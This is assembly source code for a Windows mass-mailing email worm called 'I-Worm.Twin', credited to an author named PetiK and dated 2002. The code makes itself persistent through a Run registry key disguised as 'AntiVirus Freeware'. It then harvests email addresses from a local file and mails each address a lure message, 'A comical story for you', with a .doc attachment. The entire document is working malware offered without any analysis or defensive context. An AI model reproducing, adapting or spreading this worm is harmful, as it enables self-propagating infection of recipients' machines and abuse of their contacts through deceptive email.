comment #
Name : I-Worm.Twin
Author : PetiK
Date : January 30th 2002 - February 1st 2002
Size : 6656 bytes

Action : See yourself. It's not complex.
#

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include useful.inc
include myinclude.inc

start:	push	50
	mov	esi,offset orig_worm
	push	esi
	push	0
	api	GetModuleFileNameA

	push	25
	push	esi
	push	1
	@pushsz	"AntiVirus Freeware"
	@pushsz	"Software\Microsoft\Windows\CurrentVersion\Run"
	push	80000002h
	api	SHSetValueA

	@pushsz "C:\twin.vbs"
	api	DeleteFileA

	push	50
	push	offset pathname
	api	GetWindowsDirectoryA
	@pushsz	"\NetInfo.doc"
	push	offset pathname
	api	lstrcat

verif_inet:
	push	0
	push	offset inet
	api	InternetGetConnectedState
	dec	eax
	jnz	verif_inet

	push	0
	push	0
	push	3
	push	0
	push	1
	push	80000000h
	@pushsz	"C:\backup.win"
	api	CreateFileA
	inc	eax
	je	end_worm
	dec	eax
	xchg	ebx,eax

	push	0
	push	0
	push	0
	push	2
	push	0
	push	ebx
	api	CreateFileMappingA
	test	eax,eax
	je	end_w1
	xchg	eax,ebp

	push	0
	push	0
	push	0
	push	4
	push	ebp
	api	MapViewOfFile
	test	eax,eax
	je	end_w2
	xchg	eax,esi

	push	0
	push	ebx
	api	GetFileSize
	cmp	eax,3
	jbe	end_w3

scan_mail:
	xor	edx,edx
	mov	edi,offset mail_addr
	push	edi
	p_c:	lodsb
	cmp	al," "
	je	car_s
	cmp	al,0dh
	je	entr1
	cmp	al,0ah
	je	entr2
	cmp	al,"#"
	je	f_mail
	cmp	al,'@'
	jne	not_a
	inc	edx
	not_a:	stosb
		jmp p_c
	car_s:	inc esi
		jmp p_c
	entr1:	xor al,al
		stosb
		pop edi
		test edx,edx
		je  scan_mail
		call send_mail
		jmp scan_mail
	entr2:	xor al,al
		stosb
		pop edi
		jmp scan_mail
	f_mail:

end_w3:	push	esi
	api	UnmapViewOfFile
end_w2:	push	ebp
	api	CloseHandle
end_w1:	push	ebx
	api	CloseHandle


end_worm:
	push	0
	api	ExitProcess

send_mail:
	xor	eax,eax
	push	eax
	push	eax
	push	offset Message
	push	eax
	push	[sess]
	api	MAPISendMail
	ret

.data
orig_worm	db 50 dup (0)
pathname	db 50 dup (0)
mail_addr	db 128 dup (?)
inet		dd 0
sess		dd 0

subject		db "A comical story for you.",0
body		db "I send you a comical story found on the Net.",0dh,0ah,0dh,0ah
		db 9,"Best Regards. You friend.",0
filename	db "comical_story.doc",0

Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd ?
		dd ?
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset mail_addr
		dd offset mail_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset pathname
		dd offset filename
		dd ?


end start
end